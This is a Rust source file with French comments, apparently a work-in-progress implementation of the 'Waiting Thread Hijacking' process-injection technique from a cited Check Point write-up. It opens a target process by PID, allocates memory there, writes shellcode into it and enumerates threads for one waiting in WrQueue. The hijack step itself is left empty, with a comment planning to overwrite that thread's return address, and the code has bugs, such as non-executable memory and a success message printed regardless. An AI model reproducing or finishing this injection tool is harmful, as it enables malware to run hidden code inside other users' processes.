    //https://research.checkpoint.com/2025/waiting-thread-hijacking/
    /*
    Steps : 
        Exécution: 
            - usage : ./waiting_thread_hijacking.exe [PID]
        Lire NtQuerySystemInformation 
            - Trouver le PID dans SystemProcessInformation de NtQuerySystemInformation 
            - Si on le trouve :
                - Trouver un thread avec ThreadState qui a la valeur WrQueue  
            - Injecter notre shellcode 
            - S'assurer du Happy Ending ;) 
    */

use std::collections::HashMap;
use std::{env, slice};
use std::ptr::null_mut;
use std::fmt::{self, Display};
use winapi::shared::ntdef::*;
use winapi::shared::minwindef::DWORD;
use winapi::shared::ntstatus::*;
use winapi::shared::minwindef::FALSE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{self, OpenProcess};
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use ntapi::ntexapi::*;

impl std::error::Error for Error {}

mod shellcode;
use shellcode::SHELLCODE;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};

#[derive(Debug)]
pub enum Error {
    /// Code NTSTATUS retourné par un appel Nt* (< 0 signifie échec).
    Nt(NTSTATUS),
    NotFound(u32), // on conserve le PID pour le contexte si besoina
    OpenHandle(HANDLE),
    OpenHandleWriting(HANDLE),
}

impl From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self {
        Self::Nt(status)
    }
}

impl Display for Error {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Error::Nt(code) => write!(f, "[!] Échec NTSTATUS = 0x{:X}", *code as u32),
            Error::NotFound(pid) => write!(f, "[!] Processus PID={} non trouvé", pid),
            Error::OpenHandle(handle) => write!(f,"[!] Impossible d'ouvrir un Handle vers le PID donné"),
            Error::OpenHandleWriting(handle) => write!(f, "[!] Impossible d'ouvrir le handle en écriture"),
        }
    }
}

struct ThreadInfo{
    tid:DWORD,
    start_addr:u64,
    is_extended:bool,
    ext: ThreadInfoExt,
}
struct ThreadInfoExt {
    sys_start_addr: u64,
    state: u32,
    wait_reason: u32,
    wait_time: u32,
}

fn get_process_thread(pid:DWORD,threads_info:& mut HashMap<DWORD,ThreadInfo>)-> Result<(),Error >{ //Ou Error ?
    unsafe {
        let mut buffer_size:ULONG = 0;
        let status_first = NtQuerySystemInformation(
            SystemProcessInformation, 
            null_mut(), 
            0, 
            &mut buffer_size);
        
        if status_first != STATUS_INFO_LENGTH_MISMATCH as NTSTATUS {
            return Err(status_first.into());
        }
        let mut buffer:Vec<u8> = Vec::with_capacity(buffer_size as usize); 
        
        let sys_info = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as PVOID,
            buffer_size, 
            &mut buffer_size);
        if !NT_SUCCESS(sys_info){
            return Err(sys_info.into());
        }
        let mut sys_procces_info = buffer.as_mut_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        let mut found = false;
        while !sys_procces_info.is_null(){
            if (*sys_procces_info).UniqueProcessId as u32 == pid {
                found = true;
                break;
            }
            if (*sys_procces_info).NextEntryOffset == 0 {
                break;
            }
            sys_procces_info = (sys_procces_info as usize + (*sys_procces_info).NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;  
        }
        if !found{
            return Err(Error::NotFound(pid))
        }
        let thread_count = (*sys_procces_info).NumberOfThreads as usize;
         // &(*ptr).Threads pointe sur le premier SYSTEM_THREAD_INFORMATION
        let threads_ptr = &(*sys_procces_info).Threads as *const SYSTEM_THREAD_INFORMATION;
        let threads_slice: &[SYSTEM_THREAD_INFORMATION] = slice::from_raw_parts(threads_ptr, thread_count);
        for ti in threads_slice {
            let tid = ti.ClientId.UniqueThread as DWORD;
            let state = ti.ThreadState;
            let raison = ti.WaitReason;
            //https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-thread
            // Etat 5 = Waiting Thread Reason 15 : WrQueue, c'est ce qu'on veut
            println!("[*] Thread TID={tid}  Etat={state} Raison={raison}");
            
            let thread_info = ThreadInfo{
                tid : tid,
                start_addr : 0,
                is_extended : true,
                ext : ThreadInfoExt { 
                    sys_start_addr: ti.StartAddress as u64,
                    state: state,
                    wait_reason: raison,
                    wait_time: ti.WaitTime 
                }
            };
            threads_info.insert(pid, thread_info);
        }
    }       
    Ok(())
}

fn allocate_shellcode_memory(pid:DWORD)->Result<PVOID,Error>{
    unsafe {
        let handle = OpenProcess( PROCESS_VM_OPERATION, FALSE,pid);
        if handle.is_null() {
            return Err(Error::OpenHandle(handle));
        }
        let p_shellcode = VirtualAllocEx(handle,null_mut(),SHELLCODE.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
        CloseHandle(handle);
        Ok(p_shellcode)
    }
}

fn write_shellcode_into_process(pid:DWORD,p_shellcode:PVOID) -> Result<(),Error>{
    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
        let mut bytes_written:usize = 0;
        let status = WriteProcessMemory(handle, p_shellcode, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), &mut bytes_written);
        CloseHandle(handle);
        if status == 0 || bytes_written != SHELLCODE.len(){
            return Err(Error::OpenHandleWriting(handle));
        }
        println!("[+] {bytes_written} Bytes ont été écrit, Pointeur vers p_shellcode {:x}", p_shellcode as u64);
        Ok(())
    }
    
}


fn inject(pid:DWORD, p_shellcode:PVOID) -> Result<(),Error>{
    Ok(())
}

fn run_proccess_injection(pid:DWORD)-> Result<(),Error>{
    let mut threads_info:HashMap<DWORD,ThreadInfo> = HashMap::new();
    let p_shellcode = allocate_shellcode_memory(pid)?;
    write_shellcode_into_process(pid, p_shellcode)?;
    get_process_thread(pid,&mut threads_info)?;

    //Prochaines étapes : Regarder si le thread en WrQueue est compatible avec ce qu'on peut faire ; Overwrite son addresse de retour avec le pointeur vers l'adresse mémoire de notre shellcode
    Ok(())
}


fn main(){
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprintln!("[*] Usage: ./waiting_thread_hijacking.exe [PID]");
        return;
    }
    let pid: DWORD = match args[1].parse() {
        Ok(n) if n != 0 => n,
        _ => {
            println!("[*] T'es sérieux ?");
            return;
        }
    };
    match run_proccess_injection(pid){
        Ok(())=>println!("[!] Process Injecté avec succès !"),
        Err(err) => println!("Error : {}",err),
    };
}   
